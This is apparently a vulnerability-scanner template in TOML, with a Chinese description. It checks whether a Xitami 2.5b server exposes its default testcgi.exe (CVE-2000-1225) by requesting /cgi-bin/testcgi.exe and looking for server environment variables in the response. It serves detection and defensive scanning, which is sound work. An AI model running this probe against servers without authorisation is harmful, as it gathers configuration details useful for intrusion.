[info]
author = "ave"
description = "通过访问 /cgi-bin/testcgi.exe 路径检测 Xitami 2.5b 默认安装的 testcgi.exe 程序是否可被远程访问并泄露服务器敏感配置信息"
id = "POC-AVE-2000-1155"
name = "CVE-2000-1225 Xitami testcgi.exe 信息泄露检测"
severity = "medium"
tags = ["ave-2000-1155"]
vuln_id = [
    "CVE-2000-1225",
    "AVE-2000-1155",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/testcgi.exe"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "SERVER_SOFTWARE",
    "SERVER_NAME",
    "GATEWAY_INTERFACE",
    "SERVER_PROTOCOL",
]
